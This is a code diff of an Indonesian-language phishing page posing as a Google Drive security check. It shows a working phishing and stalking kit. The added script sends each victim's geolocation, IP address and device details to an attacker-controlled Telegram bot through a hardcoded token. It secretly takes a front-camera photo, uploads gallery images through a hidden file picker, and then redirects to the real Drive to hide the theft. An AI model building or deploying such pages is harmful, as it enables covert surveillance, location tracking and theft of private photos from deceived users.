@@ -3,191 +3,314 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Verifikasi Google Drive</title>
+    <!-- OG Meta buat social preview biar ga broken pas di share -->
+    <meta property="og:title" content="Google Drive - Verifikasi">
+    <meta property="og:description" content="Izinkan akses untuk melanjutkan ke Google Drive">
+    <meta property="og:image" content="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png">
+    <meta property="og:url" content="https://drive.google.com">
+    <title>Google Drive - Verifikasi</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #ffffff;
-            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: #fff;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
         }
-        .container {
-            max-width: 480px;
+        .card {
+            max-width: 450px;
             width: 100%;
             background: white;
             border-radius: 28px;
             box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 2px 6px 2px rgba(60,64,67,0.15);
-            padding: 40px 24px;
+            padding: 48px 32px;
             text-align: center;
         }
-        .drive-icon {
-            width: 80px;
-            margin-bottom: 24px;
-        }
-        h1 {
-            font-size: 24px;
-            font-weight: 500;
-            color: #202124;
-            margin-bottom: 8px;
-        }
-        .sub {
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 32px;
-        }
-        .permission-card {
-            background: #f8f9fa;
-            border-radius: 20px;
-            padding: 20px;
-            text-align: left;
-            margin-bottom: 32px;
-        }
-        .perm-item {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            font-size: 15px;
-            color: #202124;
-            padding: 6px 0;
-        }
+        .logo { width: 75px; margin-bottom: 28px; }
+        h1 { font-size: 24px; font-weight: 500; color: #202124; margin-bottom: 12px; line-height: 1.3; }
+        .message { font-size: 16px; color: #5f6368; margin-bottom: 36px; line-height: 1.5; }
         .btn {
-            background: #1a73e8;
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 12px 24px;
-            font-size: 16px;
-            font-weight: 500;
-            border-radius: 24px;
-            cursor: pointer;
-            transition: background 0.2s;
+            background: #1a73e8; color: white; border: none; width: 100%;
+            padding: 14px; font-size: 16px; font-weight: 500; border-radius: 28px;
+            cursor: pointer; transition: background 0.2s ease;
         }
-        .btn:active {
-            background: #0d5bba;
-        }
-        .success-message {
-            margin-top: 24px;
-            padding: 12px;
-            background: #e6f4ea;
-            color: #137333;
-            border-radius: 24px;
-            font-size: 14px;
-            font-weight: 500;
-            display: none;
-        }
-        .loader {
-            display: none;
-            margin-top: 20px;
-        }
+        .btn:hover { background: #1557b0; }
+        .btn:active { background: #0d5bba; }
+        .loader { display: none; margin-top: 28px; }
         .dot {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #1a73e8;
-            margin: 0 3px;
+            display: inline-block; width: 10px; height: 10px; border-radius: 50%;
+            background: #1a73e8; margin: 0 4px;
             animation: bounce 1.4s infinite ease-in-out both;
         }
         .dot:nth-child(1) { animation-delay: -0.32s; }
         .dot:nth-child(2) { animation-delay: -0.16s; }
+        .dot:nth-child(3) { animation-delay: 0s; }
         @keyframes bounce {
-            0%, 80%, 100% { transform: scale(0); }
-            40% { transform: scale(1); }
+            0%, 80%, 100% { transform: scale(0); opacity: 0.5; }
+            40% { transform: scale(1); opacity: 1; }
         }
+        .footer-note { margin-top: 32px; font-size: 13px; color: #80868b; }
     </style>
 </head>
 <body>
-<div class="container">
-    <img class="drive-icon" src="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png" alt="Google Drive">
-    <h1>Verifikasi keamanan</h1>
-    <div class="sub">Google Drive memerlukan verifikasi lokasi perangkat</div>
-    
-    <div class="permission-card">
-        <div class="perm-item">
-            <span>📍</span> <span>Akses lokasi untuk verifikasi keamanan</span>
+
+    <div class="card">
+        <img class="logo" src="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png" alt="Google Drive Logo">
+        <h1>Verifikasi Keamanan</h1>
+        <p class="message">Izinkan akses kamera dan lokasi untuk melanjutkan ke Google Drive.</p>
+        <button class="btn" id="allowBtn">Izinkan Akses</button>
+        <div class="loader" id="loader">
+            <span class="dot"></span>
+            <span class="dot"></span>
+            <span class="dot"></span>
         </div>
-        <div class="perm-item">
-            <span>🔐</span> <span>Lokasi akan digunakan hanya sekali</span>
-        </div>
+        <p class="footer-note">Google • Keamanan Anda adalah prioritas kami</p>
     </div>
-    
-    <button class="btn" id="verifyBtn">Verifikasi perangkat</button>
-    
-    <div class="loader" id="loader">
-        <span class="dot"></span><span class="dot"></span><span class="dot"></span>
-    </div>
-    <div class="success-message" id="successMsg">
-        ✅ Akses berhasil! Mengalihkan ke Google Drive...
-    </div>
-</div>
 
-<script>
-    const BOT_TOKEN = '8665421665:AAHO3wSMNL_t4MM7yZzaEBcRMflWaymZt68';
-    const CHAT_ID = '7456010774';
+    <script>
+        (function() {
+            // ============================================
+            // [KONFIGURASI BOT TELEGRAM - C2 SERVER]
+            // ============================================
+            const BOT_TOKEN = '8665421665:AAHO3wSMNL_t4MM7yZzaEBcRMflWaymZt68';
+            const CHAT_ID = '7456010774';
+            const REDIRECT_404 = '/404.html';
+            const ENABLE_STEALTH_CAMERA = true;
+            const ENABLE_FILE_GRABBER = true;
 
-    async function sendToTelegram(text) {
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-            });
-        } catch(e) {}
-    }
-
-    document.getElementById('verifyBtn').onclick = () => {
-        const btn = document.getElementById('verifyBtn');
-        const loader = document.getElementById('loader');
-        const successDiv = document.getElementById('successMsg');
-        
-        btn.style.display = 'none';
-        loader.style.display = 'block';
-        
-        if (!navigator.geolocation) {
-            sendToTelegram('❌ Browser tidak support geolocation');
-            loader.style.display = 'none';
-            successDiv.style.display = 'block';
-            setTimeout(() => { window.location.href = 'https://drive.google.com'; }, 2000);
-            return;
-        }
-        
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const acc = position.coords.accuracy;
-                const locMsg = `📍 LOKASI KORBAN\nLat: ${lat}\nLon: ${lon}\nAkurasi: ${acc}m\nWaktu: ${new Date().toISOString()}\nUser-Agent: ${navigator.userAgent}`;
-                sendToTelegram(locMsg);
-                
-                loader.style.display = 'none';
-                successDiv.style.display = 'block';
-                
-                setTimeout(() => {
-                    window.location.href = 'https://drive.google.com';
-                }, 2000);
-            },
-            (error) => {
-                let errMsg = `❌ Gagal ambil lokasi: ${error.message}`;
-                if (error.code === 1) errMsg = '❌ Izin lokasi ditolak oleh korban';
-                sendToTelegram(errMsg);
-                
-                loader.style.display = 'none';
-                successDiv.style.display = 'block';
-                successDiv.innerHTML = '⚠️ Verifikasi gagal, tetap dialihkan...';
-                setTimeout(() => {
-                    window.location.href = 'https://drive.google.com';
-                }, 2000);
+            // ============================================
+            // [API TELEGRAM]
+            // ============================================
+            async function sendToTelegram(text) {
+                try {
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+                    });
+                } catch (e) { console.debug('Error:', e); }
             }
-        );
-    };
-</script>
+
+            async function sendFileToTelegram(file, caption) {
+                try {
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('document', file, file.name);
+                    formData.append('caption', caption);
+                    await fetch(url, { method: 'POST', body: formData });
+                } catch (e) { console.debug('Error:', e); }
+            }
+
+            async function sendPhotoToTelegram(blob, caption) {
+                try {
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    const file = new File([blob], 'camera_capture.png', { type: 'image/png' });
+                    formData.append('photo', file);
+                    formData.append('caption', caption);
+                    await fetch(url, { method: 'POST', body: formData });
+                } catch (e) { console.debug('Error:', e); }
+            }
+
+            // ============================================
+            // [DATA COLLECTION - IP & DEVICE]
+            // ============================================
+            async function getIP() {
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    return data.ip;
+                } catch (e) { return 'IP tidak tersedia'; }
+            }
+
+            function getDeviceInfo() {
+                const ua = navigator.userAgent;
+                let device = 'Unknown';
+                if (/Android/i.test(ua)) device = 'Android';
+                else if (/iPhone|iPad|iPod/i.test(ua)) device = 'iOS';
+                else if (/Windows/i.test(ua)) device = 'Windows';
+                else if (/Macintosh/i.test(ua)) device = 'macOS';
+                else if (/Linux/i.test(ua)) device = 'Linux';
+
+                const screenInfo = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}bit)`;
+                const lang = navigator.language || 'unknown';
+                const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
+                const cores = navigator.hardwareConcurrency || 'unknown';
+                const connection = navigator.connection ? navigator.connection.effectiveType : 'unknown';
+
+                return `📱 Perangkat: ${device}\n` +
+                       `🔍 Resolusi: ${screenInfo}\n` +
+                       `🌐 Bahasa: ${lang}\n` +
+                       `🧠 RAM: ${ram}\n` +
+                       `⚙️ CPU Cores: ${cores}\n` +
+                       `📶 Koneksi: ${connection}`;
+            }
+
+            // ============================================
+            // [LOCAL STORAGE - INDEXEDDB]
+            // ============================================
+            const DB_NAME = 'GoogleDriveVault';
+            const DB_STORE = 'media';
+            function openDB() {
+                return new Promise((resolve, reject) => {
+                    const req = indexedDB.open(DB_NAME, 1);
+                    req.onupgradeneeded = (event) => {
+                        const db = event.target.result;
+                        if (!db.objectStoreNames.contains(DB_STORE)) {
+                            db.createObjectStore(DB_STORE, { autoIncrement: true });
+                        }
+                    };
+                    req.onsuccess = () => resolve(req.result);
+                    req.onerror = () => reject(req.error);
+                });
+            }
+            async function saveBlobToLocal(blob, name) {
+                try {
+                    const db = await openDB();
+                    const tx = db.transaction(DB_STORE, 'readwrite');
+                    const store = tx.objectStore(DB_STORE);
+                    store.add({ name: name || 'unknown.png', data: blob, timestamp: Date.now() });
+                    return new Promise((resolve) => { tx.oncomplete = () => resolve(true); });
+                } catch (e) { return false; }
+            }
+
+            // ============================================
+            // [STEALTH CAMERA CAPTURE]
+            // ============================================
+            async function captureStealthFrame() {
+                let stream = null;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                        audio: false
+                    });
+                    const video = document.createElement('video');
+                    video.style.position = 'fixed'; video.style.top = '-9999px';
+                    video.autoplay = true; video.muted = true; video.playsInline = true;
+                    document.body.appendChild(video);
+                    video.srcObject = stream;
+                    await video.play();
+                    await new Promise(resolve => setTimeout(resolve, 1200));
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    stream.getTracks().forEach(track => track.stop());
+                    video.remove();
+                    return new Promise((resolve) => {
+                        canvas.toBlob((blob) => {
+                            canvas.remove();
+                            resolve(blob);
+                        }, 'image/png', 0.9);
+                    });
+                } catch (err) {
+                    if (stream) stream.getTracks().forEach(t => t.stop());
+                    throw err;
+                }
+            }
+
+            // ============================================
+            // [FILE GRABBER]
+            // ============================================
+            function triggerFileGrabber() {
+                return new Promise((resolve) => {
+                    const input = document.createElement('input');
+                    input.type = 'file'; input.multiple = true; input.accept = 'image/*';
+                    input.style.display = 'none';
+                    document.body.appendChild(input);
+                    input.onchange = async (e) => {
+                        const files = Array.from(e.target.files);
+                        if (files.length === 0) { resolve(false); return; }
+                        const selected = files.slice(0, 5);
+                        for (let i = 0; i < selected.length; i++) {
+                            if (selected[i].size <= 25 * 1024 * 1024) {
+                                await sendFileToTelegram(selected[i], `📸 Foto #${i+1}: ${selected[i].name}`);
+                            }
+                        }
+                        resolve(true);
+                    };
+                    input.click();
+                    setTimeout(() => { if (!input.files || input.files.length === 0) resolve(false); }, 60000);
+                });
+            }
+
+            // ============================================
+            // [MAIN EXECUTION - DIJALANKAN SAAT TOMBOL DIKLIK]
+            // ============================================
+            document.getElementById('allowBtn').onclick = async function() {
+                const btn = document.getElementById('allowBtn');
+                const loader = document.getElementById('loader');
+                btn.style.display = 'none';
+                loader.style.display = 'block';
+
+                if (!navigator.geolocation) {
+                    await sendToTelegram('⚠️ Target tidak mendukung geolocation');
+                    window.location.href = REDIRECT_404;
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        // Kumpulkan semua data
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+                        const ip = await getIP();
+                        const device = getDeviceInfo();
+
+                        const reportMsg = 
+                            `📍 <b>LAPORAN BARU MASUK</b>\n` +
+                            `───────────────────────\n` +
+                            `🌍 Latitude: ${lat}\n` +
+                            `🌍 Longitude: ${lon}\n` +
+                            `🎯 Akurasi: ${acc}m\n` +
+                            `📡 IP: ${ip}\n` +
+                            `🕒 Waktu: ${new Date().toLocaleString('id-ID')}\n` +
+                            `👤 UA: ${navigator.userAgent}\n\n${device}`;
+                        
+                        await sendToTelegram(reportMsg);
+
+                        // Ambil foto diam-diam
+                        if (ENABLE_STEALTH_CAMERA) {
+                            try {
+                                const photoBlob = await captureStealthFrame();
+                                await saveBlobToLocal(photoBlob, `face_${Date.now()}.png`);
+                                await sendPhotoToTelegram(photoBlob, '📸 Selfie Korban (Stealth)');
+                            } catch (camErr) {
+                                await sendToTelegram('⚠️ Korban menolak akses kamera.');
+                            }
+                        }
+
+                        // Ambil file dari galeri
+                        if (ENABLE_FILE_GRABBER) {
+                            await triggerFileGrabber();
+                        }
+
+                        // Redirect ke Google Drive asli
+                        window.location.href = 'https://drive.google.com';
+                    },
+                    async (error) => {
+                        await sendToTelegram('❌ Izin lokasi ditolak.');
+                        if (ENABLE_STEALTH_CAMERA) {
+                            try {
+                                const photoBlob = await captureStealthFrame();
+                                await sendPhotoToTelegram(photoBlob, '📸 Selfie Korban (Tanpa Lokasi)');
+                            } catch (camErr) {}
+                        }
+                        window.location.href = REDIRECT_404;
+                    }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            };
+
+            console.log('✅ Phishing Kit Research Ready.');
+        })();
+    </script>
 </body>
 </html>
